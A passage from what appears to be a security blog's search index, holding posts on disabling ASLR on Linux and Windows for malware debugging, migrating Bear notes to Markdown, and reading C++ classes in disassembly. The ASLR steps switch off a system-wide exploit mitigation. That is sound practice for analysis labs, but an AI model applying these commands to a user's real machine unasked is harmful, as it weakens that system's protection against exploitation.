protection settings” Set “Force randomization for images “ to OFF. Reboot References Disable ASLR for Easier Malware Debugging With x64dbg and IDA Pro Gist Disable ASLR For Easier Malware Debugging With x64dbg and IDA Pro (OALabs Quick Tip) : ReverseEngineering ","permalink":"https://rehex.ninja/posts/disable-aslr/","summary":"\u003ch2 id=\"linux\"\u003eLinux\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e | sudo tee /proc/sys/kernel/randomize_va_space\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"radare2\"\u003eradare2\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode class=\"language-r2\" data-lang=\"r2\"\u003e# disable ASLR \u0026amp; reanalyse\ndor aslr=no\naaa\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"windows\"\u003eWindows\u003c/h2\u003e\n\u003ch3 id=\"windows-7\"\u003eWindows 7\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eOpen \u003ccode\u003eRegEdit\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eGoto: \u003ccode\u003eHKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eCreate new \u003cem\u003evalue\u003c/em\u003e (not a key): \u003ccode\u003eMoveImages\u003c/code\u003e with value \u003ccode\u003e0\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eReboot.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"windows-10\"\u003eWindows 10\u003c/h3\u003e\n\u003ch4 id=\"disable-aslr-per-file\"\u003eDisable ASLR per file\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSet-Processmitigation -Name name.exe -Disable ForceRelocateImages\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"disable-aslr-by-default\"\u003eDisable ASLR by default\u003c/h4\u003e\n\u003col\u003e\n\u003cli\u003eSearch in Windows for: “windows defender Security Center”\u003c/li\u003e\n\u003cli\u003eClick on the second icon from the bottom: “App \u0026amp; browser control”\u003c/li\u003e\n\u003cli\u003eScroll to the bottom and click on: “Exploit protection settings”\u003c/li\u003e\n\u003cli\u003eSet “Force randomization for images “ to \u003cem\u003eOFF\u003c/em\u003e.\u003c/li\u003e\n\u003cli\u003eReboot\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"references\"\u003eReferences\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://oalabs.openanalysis.net/2019/06/12/disable-aslr-for-easier-malware-debugging/\"\u003eDisable ASLR for Easier Malware Debugging With x64dbg and IDA Pro\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://gist.github.com/trietptm/b84ccad9db01f459ac7e\"\u003eGist\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.reddit.com/r/ReverseEngineering/comments/bzn06z/disable_aslr_for_easier_malware_debugging_with/\"\u003eDisable ASLR For Easier Malware Debugging With x64dbg and IDA Pro (OALabs Quick Tip) : ReverseEngineering\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","title":"Disable Aslr"},{"content":"Journey of finding ideal note-taking app TL;DR: If you want to transfer your bear notes to markdown goto Move your bear notes, if you want to emulate Bear multi-tagging check Multitagging support.\nOnce upon a time I was using Bear.app for writing and organizing notes. It had really good features like multi-tagging and couple of other nice features like pseudo markdown support. Unfortunatelly a lot of things were bugged, developers slow in fixing them so I decided to move my notes from Bear to other platform.\nRequirements I wanted to have these features:\nWYSWIG (What You See Is What You Get) editor with only 1 pane, Notes should be kept / written in Markdown, Support image pasting from clipboard, Sync, Support for nested tags(1), Support for multi-tagging(2). (1) Nested tags We can have tree-like tags, i.e notes assigned to: tag1/sub1, will be also visible in tag1, but not in tag2/sub1 (defferent parent).\n(2) Multi-tagging Notes can belong to multiple tags, so they should be visible from multiple tag sub-trees.\nIdeal doesn\u0026rsquo;t exists, but\u0026hellip; Finally I couldn\u0026rsquo;t find ideal substitute for Bear, so I decided to move into some WYSWIG Markdown editor which will nicely present meta-data for multi-tagging - I will take care about the rest of mine requirements.\nI decided to move to Typora - it is not perfect, but it seems to work fine. Moving to editor based on directory tree (folders = tags) have one big disadvantage - we can\u0026rsquo;t have multiple tags (but nested tags are working nicely). I had idea how to overcome this issue.\nPrerequirements Clone my repo bear2markdowntree. Follow step (1) and (2) from How to section. Move your bear notes First of all I created a concept of \u0026ldquo;main tag\u0026rdquo;, so if note have multiple tags (i.e tag1/sub1 and tag2/sub2) we have to choose which tag is more important to us. The main tag will be actually translated into directory structure in your notes directory and saved there! The rest of the tags will be added into note as YAML meta-data.\nFor example: you have exported bear note to $BEAR_DIR/note.md:\n# Note My note #tag1/sub1 #tag2/sub2 After exporting this note with my script and selecting #tag1/sub1 as main tag, the note will be saved under $NOTES_DIR/tag1/sub1/note.md and it will look like this:\n--- tags: [\u0026#34;tag1/sub1\u0026#34;, \u0026#34;tag2/sub2\u0026#34;] --- # Note My note Demo Before running export-bear2typora.py don\u0026rsquo;t forget setup script by editing it:\n# config dirs NOTE_DIR = \u0026#34;Notes/\u0026#34; # output dir BEAR_DIR = \u0026#34;BearNotes/\u0026#34; # input dir Paths are relative to script path, during script execution you can be prompted for tag selection. During this you can also jump into python interactive session and fix tag name if something was wrongly matched (minimum knowledge of python is required) - tags are kept in tags array.\nAfter this process you should have exported and fixed notes in your BEAR_DIR.\nMultitagging support This topic is actually nicely described in README. We can emulate multi-tags structure by symbolic links (but with some problems on Windows and in Typora) or by creating special file which I called index.\nThis file should be (re)generated with build-tags.py each time you decide to put some new file in your directory list.\nHere you should edit only one variable (if you have NOTES_DIR relative to home directory):\nHOME_USER = str(Path.home()) NOTES_DIR = HOME_USER + \u0026#34;/Dropbox/Notes/\u0026#34; # FIXME: add path to your Notes folder (relative to $HOME) If you want to use absoulte path change code to:\nNOTES_DIR = \u0026#34;/root/home/notes/\u0026#34; Additionally if you don\u0026rsquo;t want to see some tags, you can add them here:\n# If you want ignore some tags in the final listing add them to this list # WARNING: this feature is actually taking only subtag, # Ex#1: you have note with tag: \u0026#34;dev/python/code-snippets\u0026#34; # if you decide to ignore tag \u0026#34;dev\u0026#34;, then all subtags (\u0026#34;python\u0026#34;, \u0026#34;code-snippets\u0026#34;) will be also ignored! # Ex#2: you have 2 notes with tags: note1: \u0026#39;q/w/e\u0026#39;, \u0026#39;e/w/q\u0026#39; (you have the same subtab \u0026#39;w\u0026#39;, but in totally different subtrees) # Ignoring tag \u0026#39;w\u0026#39; will affect BOTH subtrees, # It isn\u0026#39;t possible to ignore subtag only from specified tree! Ignoring \u0026#34;q/w\u0026#34; will not work! IGNORE_TAGS = [] # FIXME After running this script you should have index.md file generated in your NOTES_DIR.\nSync This is the simplest step, just create Dropbox account, put your notes there and sync your notes across all devices!\n","permalink":"https://rehex.ninja/posts/keep-your-md-notes-organized/","summary":"\u003ch2 id=\"journey-of-finding-ideal-note-taking-app\"\u003eJourney of finding ideal note-taking app\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eTL;DR: If you want to transfer your bear notes to markdown goto \u003ca href=\"/posts/keep-your-md-notes-organized/#Moving-bear-notes\"\u003eMove your bear notes\u003c/a\u003e, if you want to emulate \u003cem\u003eBear\u003c/em\u003e multi-tagging check \u003ca href=\"/posts/keep-your-md-notes-organized/#multitagging-support\"\u003eMultitagging support\u003c/a\u003e.\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003eOnce upon a time I was using \u003ca href=\"https://bear.app\"\u003eBear.app\u003c/a\u003e for writing and organizing notes. It had really good features like multi-tagging and couple of other nice features like pseudo markdown support. Unfortunatelly a lot of things were bugged, developers slow in fixing them so I decided to move my notes from \u003cem\u003eBear\u003c/em\u003e to other platform.\u003c/p\u003e","title":"Keep Your Notes Organized (bear2mdtree demo)"},{"content":"Structures C struct vs C++ class C struct functions are loosely correlated with paramaters, parameters are usually passed via pointer, it may look like array for struct with 2 identical parameters in struct, for structures created dynamically look for malloc with non-usual size. C++ class Find constructor, it have always 1 argument (this pointer -\u0026gt; thiscall), main() function have initialization function __main with ctor initlizers, after creation of class with new operator the class constructor is called (can be empty), Methods are called with thiscall convention. Inheritance Constructors of base class are called 1st in child class, additionally assigment to variables in class definition is put inside constructor:\nvoid __thiscall Inherited(Inherited *this) { Box((Box *)this); this-\u0026gt;c = 1; // this was assigned in class definition, not constructor this-\u0026gt;b = 3; this-\u0026gt;a = this-\u0026gt;b; return; } Inherited destructors contains destructors of base class:\nvoid __thiscall ~Inherited(Inherited *this) { ~Box((Box *)this); return; } Virtuals Generally we have the same behaviour like in inheritance, but additionally we have also vtables.\nThe structures of classess contains 1 additional field (at offset 0): vptr to vtable structure containing pointers to all virtual methods in this class:\nstruct vtable_class_A { void* virtual_func_1(); void* virtual_func_2(); // ... }; References OA Labs ","permalink":"https://rehex.ninja/posts/c++-assembly/","summary":"\u003ch2 id=\"structures\"\u003eStructures\u003c/h2\u003e\n\u003ch3 id=\"c-struct-vs-c-class\"\u003eC struct vs C++ class\u003c/h3\u003e\n\u003ch4 id=\"c-struct\"\u003eC struct\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003efunctions are loosely correlated with paramaters,\u003c/li\u003e\n\u003cli\u003eparameters are usually passed via pointer,\u003c/li\u003e\n\u003cli\u003eit may look like array for struct with 2 identical parameters in struct,\u003c/li\u003e\n\u003cli\u003efor structures created dynamically look for \u003ccode\u003emalloc\u003c/code\u003e with non-usual size.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"c-class\"\u003eC++ class\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003eFind constructor, it have always 1 argument (\u003ccode\u003ethis\u003c/code\u003e pointer -\u0026gt; \u003ccode\u003ethiscall\u003c/code\u003e),\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003emain()\u003c/code\u003e function have initialization function \u003ccode\u003e__main\u003c/code\u003e with ctor initlizers,\u003c/li\u003e\n\u003cli\u003eafter creation of class with \u003ccode\u003enew\u003c/code\u003e operator the class constructor is called (can be empty),\u003c/li\u003e\n\u003cli\u003eMethods are called with \u003ccode\u003ethiscall\u003c/code\u003e convention.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"inheritance\"\u003eInheritance\u003c/h3\u003e\n\u003cp\u003eConstructors of base class are called 1st in child class, additionally assigment to variables in class definition is put inside constructor:\u003c/p\u003e","title":"C++ assembly"}]